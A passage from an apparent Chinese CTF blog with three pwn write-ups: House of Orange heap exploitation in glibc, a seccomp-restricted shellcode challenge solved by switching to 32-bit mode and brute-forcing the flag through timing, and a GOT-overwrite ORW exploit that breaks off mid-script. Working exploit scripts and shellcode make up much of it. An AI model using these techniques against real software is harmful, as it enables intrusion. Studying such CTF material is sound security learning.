已经不能满足用户申请堆内存的操作，需要执行 sys_malloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>mmap_threshold<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>mp_<span class="token punctuation">.</span>n_mmaps <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>n_mmaps_max<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>在 sys_malloc 函数中存在对 top chunk size 的 check，如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>old_top <span class="token operator">==</span> <span class="token function">initial_top</span><span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> old_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>old_size<span class="token punctuation">)</span> <span class="token operator">>=</span> MINSIZE <span class="token operator">&amp;&amp;</span>      <span class="token function">prev_inuse</span><span class="token punctuation">(</span>old_top<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>      <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>old_end <span class="token operator">&amp;</span> pagemask<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p><strong>总结一下伪造的 top chunk size 的要求</strong></p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev_inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h2 id="0x02-不考虑对齐到内存页时构造House-of-Orange"><a href="#0x02-不考虑对齐到内存页时构造House-of-Orange" class="headerlink" title="0x02 不考虑对齐到内存页时构造House of Orange"></a>0x02 不考虑对齐到内存页时构造House of Orange</h2><p>示例程序: 模拟了一个溢出覆盖到 top chunk 的 size 域。我们试图把 size 改小从而实现 brk 扩展，并把原有的 top chunk 放入 unsorted bin 中。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">fake_size</span> <span class="token expression"><span class="token number">0x41</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span> <span class="token comment">// overwrite top chunk size</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们把 top chunk 的 size 覆盖为 0x41。之后申请大于这个尺寸的堆块，即 0x60。</p><p>但是运行这个程序的时候会报错：</p><p><img src="https://pic.imgdb.cn/item/60e5b9925132923bf8133d98.jpg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">test<span class="token operator">:</span> malloc<span class="token punctuation">.</span>c<span class="token operator">:</span><span class="token number">2401</span><span class="token operator">:</span> sysmalloc<span class="token operator">:</span> Assertion `<span class="token punctuation">(</span>old_top <span class="token operator">==</span> <span class="token function">initial_top</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> old_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>old_size<span class="token punctuation">)</span> <span class="token operator">>=</span> MINSIZE <span class="token operator">&amp;&amp;</span> <span class="token function">prev_inuse</span> <span class="token punctuation">(</span>old_top<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> old_end <span class="token operator">&amp;</span> <span class="token punctuation">(</span>pagesize <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>' failed<span class="token punctuation">.</span><span class="token function">Aborted</span> <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>报错的原因就时没有满足内存页对其的条件</strong></p><h2 id="0x03-正确的House-of-Orange"><a href="#0x03-正确的House-of-Orange" class="headerlink" title="0x03 正确的House of Orange"></a>0x03 正确的House of Orange</h2><h3 id="内存页对齐"><a href="#内存页对齐" class="headerlink" title="内存页对齐"></a>内存页对齐</h3><p>现代操作系统都是以内存页为单位进行内存管理的，<strong>一般内存页的大小是 4kb(0x1000)。</strong>那么伪造的 size 就必须要对齐到这个尺寸。</p><p><img src="C:\Users\sunjiajun\AppData\Roaming\Typora\typora-user-images\image-20210707222825502.png"></p><p>在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000是对于 0x1000（4kb）对齐的。</p><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。</p><h3 id="对齐之后"><a href="#对齐之后" class="headerlink" title="对齐之后"></a>对齐之后</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">fake_size</span> <span class="token expression"><span class="token number">0x1fe1</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span><span class="token operator">=</span>fake_size<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://pic.imgdb.cn/item/60e5ba735132923bf819aec2.jpg"></p><p>对齐之后就不会报错</p><p>进行分配之后我们可以观察到原来的堆经过了 brk 扩展</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F;原有的堆0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]&#x2F;&#x2F;经过扩展的堆0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们的申请被分配到 0x623010 的位置，同时原有的堆被置入 unsorted bin</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[+] unsorted_bins[0]: fw&#x3D;0x602020, bk&#x3D;0x602020 →   Chunk(addr&#x3D;0x602030, size&#x3D;0x1fc0, flags&#x3D;PREV_INUSE)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>因为 unsorted bin 中存在块，所以我们下次的分配会切割这个块</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"> malloc(0x60); 0x602030[+] unsorted_bins[0]: fw&#x3D;0x602090, bk&#x3D;0x602090 →   Chunk(addr&#x3D;0x6020a0, size&#x3D;0x1f50, flags&#x3D;PREV_INUSE)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到分配的内存是从 unsorted bin 中切割的，内存布局如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 &lt;&#x3D;&#x3D; 未被清零的unsorted bin链表0x602040:   0x0000000000602020  0x00000000006020200x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000001f51 &lt;&#x3D;&#x3D; 切割剩下的新unsorted bin0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x6020b0:   0x0000000000000000  0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>House of Orange的要点就在于此，剩下的利用牵扯到_IO_FILE 的知识，之后有空再总结。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> house </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-qwb-shellcode</title>
      <link href="//post/pwn-qwb-shellcode.html"/>
      <url>//post/pwn-qwb-shellcode.html</url>
      
        <content type="html"><![CDATA[<h1 id="QWB-shellcode"><a href="#QWB-shellcode" class="headerlink" title="QWB-shellcode"></a>QWB-shellcode</h1><h2 id="0x00-Pre"><a href="#0x00-Pre" class="headerlink" title="0x00 Pre"></a>0x00 Pre</h2><p>qwb的[强网先锋]的shellcode。做题的时候完全没啥思路，研究了不少师傅的wp之后复盘一下</p><span id="more"></span><p>先贴上一位大师傅对shellcode的总结：</p><p>这里就对应第六种情况，禁用了system和open，还限制了shellcode字符。</p><h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p>checksec保护检查：</p><p><img src="https://pic.imgdb.cn/item/60e28ae05132923bf8ca53d3.jpg"></p><p>64位程序，只开启了NX。</p><p>seccomp-tools 沙盒分析</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Mark:~&#x2F;Desktop&#x2F;shellcode$ seccomp-tools dump .&#x2F;shellcode  line  CODE  JT   JF      K&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 0000: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number 0001: 0x15 0x06 0x00 0x00000005  if (A &#x3D;&#x3D; fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025  if (A &#x3D;&#x3D; alarm) goto 0008 0003: 0x15 0x03 0x00 0x00000004  if (A &#x3D;&#x3D; stat) goto 0007 0004: 0x15 0x03 0x00 0x00000000  if (A &#x3D;&#x3D; read) goto 0008 0005: 0x15 0x02 0x00 0x00000009  if (A &#x3D;&#x3D; mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7  if (A &#x3D;&#x3D; exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000  return KILL 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只允许64位fstat和read函数运行，主要是没有open。</p><p><img src="https://pic.imgdb.cn/item/60e2fd935132923bf852adb1.jpg"></p><p>整体就是写入shellcode跑就行。但是shellcode不能有小于’\x1f’，也不能有等于‘\x7f’，即需要是可见字符。</p><h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><p>写入可见字符的shellcode跑，shellcode可以使用alpha3工具转换，同时x64构架下的fstat对应系统调用号 5 ，同时在x86构架下系统调用号 5 是 sys_open,可以整体思路就是 ：</p><p>利用沙箱的对系统构架没有限制，切换32位和64位分开调用open打开flag文件，read读取flag文件，最后由于没有write，使用cmp爆破，将每个可见字符拿去跟flag进行比较，一个字符一个字符爆破，得到flag。</p><p>但是我们发现，我们把32位shellcode读到栈上以后栈的整个环境是64的，就会产生矛盾，所以我们需要一块全新的地方来写入我们的32位shellcode。同时发现mmap函数可用，调用mmap新创建一块内存存放shellcode。</p><p>关于32位程序和64位程序的转换：</p><p>cs寄存器中存储的一个数字，0x23表示32位，0x33表示64位。调用retfq之后esp是cs寄存器值，esp+8就是返回地址了。</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>    index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./shellcode'</span><span class="token punctuation">)</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QWB - ORW</title>
      <link href="//post/pwn-qwb-orw.html"/>
      <url>//post/pwn-qwb-orw.html</url>
      
        <content type="html"><![CDATA[<h1 id="QWB-ORW"><a href="#QWB-ORW" class="headerlink" title="QWB - ORW"></a>QWB - ORW</h1><h2 id="0x-00-Pre"><a href="#0x-00-Pre" class="headerlink" title="0x 00 Pre"></a>0x 00 Pre</h2><p>qwb真的好难，强网先锋都整了一整天QAQ</p><span id="more"></span><h2 id="0x01-IDA分析"><a href="#0x01-IDA分析" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h2><p><img src="https://pic.imgdb.cn/item/60e01e815132923bf8325433.jpg"></p><p>index可以输入负数</p><p><img src="https://pic.imgdb.cn/item/60e12e605132923bf8ba9b2d.jpg"></p><p>没开启NX保护，堆栈可执行，联想到可以注入shellcode，加上index可以输入负数，这样我们就可以修改got表内容，这里我们修改Free的got表，由于只能修改0~8个字节，我们写入sys_read以读入更多内容。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&#x2F;* sys_read *&#x2F;xchg rsi,rdi;xchg eax,edx;syscall;&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样只有7个字节，满足0~8字节的限制，<code>xchg</code>指令为交换寄存器的内容，我们交换rsi和rdi，交换rax和rex的低四字节，满足sys_read的条件，如何触发sys_read，读入更多字节，同时heap可执行，我们再写入orw的shellcode即可：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; asm(&#39;&#39;&#39;sub rsp, 0x800push 0x67616c66mov rdi, rspxor esi, esimov eax, 2syscallcmp eax, 0js failedmov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscalljmp exitfailed:push 0x6c696166mov edi, 1mov rsi, rspmov edx, 4mov eax, edisyscallexit:xor edi, edimov eax, 231syscall&#39;&#39;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时我们可以申请两个chunk。这样我们在第二个chunk中填入read。第一个填入padding和shellcode，连续运行getshell</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#p = process("./pwn")</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.105.131.68"</span><span class="token punctuation">,</span><span class="token string">"12354"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'seccomp_init'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>mycode <span class="token operator">=</span><span class="token triple-quoted-string string">'''/* sys_read */xchg rsi,rdi;xchg eax,edx;syscall;'''</span>mycode <span class="token operator">=</span> asm<span class="token punctuation">(</span> mycode <span class="token punctuation">)</span>payload1 <span class="token operator">=</span> mycode<span class="token keyword">print</span> <span class="token string">"mycode len ==> "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>mycode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># chunk 2</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span><span class="token string">"8"</span><span class="token 